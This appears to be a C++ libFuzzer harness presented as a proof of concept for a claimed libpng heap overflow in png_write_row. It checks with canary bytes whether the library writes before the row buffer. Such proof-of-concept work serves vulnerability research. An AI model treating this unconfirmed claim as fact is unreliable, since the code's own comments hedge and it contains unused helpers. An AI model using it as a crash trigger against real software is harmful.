#include <cstdint>
#include <cstdlib>
#include <cstring>
#include <cstdio>
#include <cassert>

#include "png.h"

struct BufState {
  uint8_t* data;
  size_t size;
  size_t position;
};

struct PngHandler {
  png_structp png_ptr = nullptr;
  png_infop info_ptr = nullptr;
  png_bytep row_ptr = nullptr;
  BufState* buf_state = nullptr;
  
  ~PngHandler() {
    if (row_ptr) png_free(png_ptr, row_ptr);
    if (info_ptr)
      png_destroy_write_struct(&png_ptr, &info_ptr);
    else if (png_ptr)
      png_destroy_write_struct(&png_ptr, nullptr);
    
    if (buf_state) {
      free(buf_state->data); // Free the data buffer
      delete buf_state;
    }
  }
};

void* limited_malloc(png_structp, png_alloc_size_t size) {
  return (size > 8000000) ? nullptr : malloc(size);
}

void default_free(png_structp, png_voidp ptr) {
  free(ptr);
}

void user_write_data(png_structp png_ptr, png_bytep data, size_t length) {
  auto* state = static_cast<BufState*>(png_get_io_ptr(png_ptr));
  if (state->position + length > state->size) {
    // Reallocate if needed
    size_t new_size = state->size * 2;
    if (new_size < state->position + length)
      new_size = state->position + length;
    
    uint8_t* new_data = static_cast<uint8_t*>(realloc(state->data, new_size));
    if (new_data == nullptr) {
      png_error(png_ptr, "write buffer allocation error");
      return;
    }
    
    state->data = new_data;
    state->size = new_size;
  }
  
  memcpy(state->data + state->position, data, length);
  state->position += length;
}

void user_flush_data(png_structp png_ptr) {
  // No-op for memory buffer
  (void)png_ptr;
}

/*
 * Proof of Concept for libpng heap buffer overflow vulnerability
 *
 * The vulnerability is in png_write_row function in pngwrite.c (line ~888).
 * When writing a row, libpng expects that the buffer passed to png_write_row
 * has one extra byte before it to store the filter type. However, the API
 * doesn't clearly document this requirement, so applications often allocate
 * exactly the row size without the extra byte.
 *
 * This PoC demonstrates the issue by:
 * 1. Creating a minimal PNG image
 * 2. Allocating a buffer with exactly the size needed for the pixels
 * 3. Forcing aggressive memory alignment to prevent accidental padding
 * 4. Calling png_write_row, which will write one byte before the buffer start
 */

// We'll use this struct to control memory alignment
struct __attribute__((packed, aligned(1))) PreciseBuffer {
  uint8_t canary_before[16]; // Bytes before our buffer to detect overflow
  uint8_t row_data[12];      // Exactly 12 bytes for 3 RGBA pixels at 8-bit depth
  uint8_t canary_after[16];  // Bytes after our buffer to detect overflow
};

// Memory write function for libpng - discards output
static void png_memory_write(png_structp png_ptr, png_bytep data, png_size_t length) {
  (void)png_ptr;
  (void)data;
  (void)length;
}

// Dummy flush function
static void png_memory_flush(png_structp png_ptr) {
  (void)png_ptr;
}

extern "C" int LLVMFuzzerTestOneInput(const uint8_t* data, size_t size) {
  (void)data; // Unused - we're using hardcoded values
  (void)size; // Unused
  
  png_structp png_ptr;
  png_infop info_ptr;
  
  // Parameter values for a minimal image
  uint32_t width = 3;      // Creates a row width of exactly 12 bytes (3 pixels * 4 channels)
  uint32_t height = 1;     // Just one row
  int color_type = PNG_COLOR_TYPE_RGBA;  // 4 channels
  int bit_depth = 8;       // 1 byte per channel
  
  // Allocate our precisely controlled buffer
  PreciseBuffer* buffer = (PreciseBuffer*)malloc(sizeof(PreciseBuffer));
  if (!buffer) {
    std::fprintf(stderr, "Could not allocate memory\n");
    return 1;
  }
  
  // Fill canary areas with a recognizable pattern
  std::memset(buffer->canary_before, 0xAA, sizeof(buffer->canary_before));
  std::memset(buffer->canary_after, 0xBB, sizeof(buffer->canary_after));
  
  // Fill row data with a recognizable pattern
  for (size_t i = 0; i < sizeof(buffer->row_data); i++) {
    buffer->row_data[i] = 0xCC + (i & 0x0F);
  }
  
  std::printf("Creating image with width=%u, height=%u, color_type=%d, bit_depth=%d\n", 
              width, height, color_type, bit_depth);
  
  png_uint_32 row_size = width * 4; // 3 pixels * 4 bytes
  std::printf("Row size: %u bytes\n", row_size);
  assert(row_size == sizeof(buffer->row_data));
  
  // Debug info - show memory layout
  std::printf("Memory layout:\n");
  std::printf("  buffer address:         %p\n", (void*)buffer);
  std::printf("  canary_before address:  %p\n", (void*)buffer->canary_before);
  std::printf("  row_data address:       %p\n", (void*)buffer->row_data);
  std::printf("  canary_after address:   %p\n", (void*)buffer->canary_after);
  
  // Print canary values before
  std::printf("Canary values before libpng call:\n");
  std::printf("  Last 4 bytes of canary_before: %02x %02x %02x %02x\n",
              buffer->canary_before[12], buffer->canary_before[13], 
              buffer->canary_before[14], buffer->canary_before[15]);
  
  // Create PNG write structure
  png_ptr = png_create_write_struct(PNG_LIBPNG_VER_STRING, NULL, NULL, NULL);
  if (!png_ptr) {
    std::fprintf(stderr, "Could not create PNG write struct\n");
    free(buffer);
    return 1;
  }
  
  // Create PNG info structure
  info_ptr = png_create_info_struct(png_ptr);
  if (!info_ptr) {
    std::fprintf(stderr, "Could not create PNG info struct\n");
    png_destroy_write_struct(&png_ptr, NULL);
    free(buffer);
    return 1;
  }
  
  // Setup error handling - if we get here, the crash wasn't triggered by libpng's error handler
  if (setjmp(png_jmpbuf(png_ptr))) {
    std::fprintf(stderr, "Error during PNG creation\n");
    png_destroy_write_struct(&png_ptr, &info_ptr);
    free(buffer);
    return 1;
  }
  
  // Set up custom write function instead of using files
  png_set_write_fn(png_ptr, NULL, png_memory_write, png_memory_flush);
  
  // Set image attributes
  png_set_IHDR(png_ptr, info_ptr, width, height, bit_depth, color_type,
               PNG_INTERLACE_NONE, PNG_COMPRESSION_TYPE_DEFAULT, PNG_FILTER_TYPE_DEFAULT);
  
  // Write PNG info
  png_write_info(png_ptr, info_ptr);
  
  // Provide warning about what should happen
  std::printf("\nABOUT TO TRIGGER BUFFER OVERFLOW!\n");
  std::printf("png_write_row will write to buffer->row_data[-1], which is in our canary_before area\n\n");
  
  // *** THIS IS WHERE THE VULNERABILITY HAPPENS ***
  // png_write_row will write to row_data[-1] which is part of canary_before
  png_write_row(png_ptr, buffer->row_data);
  
  // If we get here, check if the canary was corrupted
  std::printf("Canary values after libpng call:\n");
  std::printf("  Last 4 bytes of canary_before: %02x %02x %02x %02x\n",
              buffer->canary_before[12], buffer->canary_before[13], 
              buffer->canary_before[14], buffer->canary_before[15]);
  
  // Check if last byte of canary_before was modified (this is where the overflow should hit)
  if (buffer->canary_before[15] != 0xAA) {
    std::printf("\nBUFFER OVERFLOW DETECTED! The canary value was changed from 0xAA to 0x%02x\n", 
                buffer->canary_before[15]);
    std::printf("This confirms the vulnerability exists but wasn't detected by AddressSanitizer\n");
    
    // Force a crash - uncomment if you want to simulate the expected crash
    // assert(0 && "Buffer overflow confirmed!");
  } else {
    std::printf("\nNo buffer overflow detected? This is unexpected.\n");
    std::printf("The overflow may have affected a different memory location or been prevented.\n");
  }
  
  // Cleanup
  png_write_end(png_ptr, NULL);
  png_destroy_write_struct(&png_ptr, &info_ptr);
  free(buffer);
  
  return 0;
}
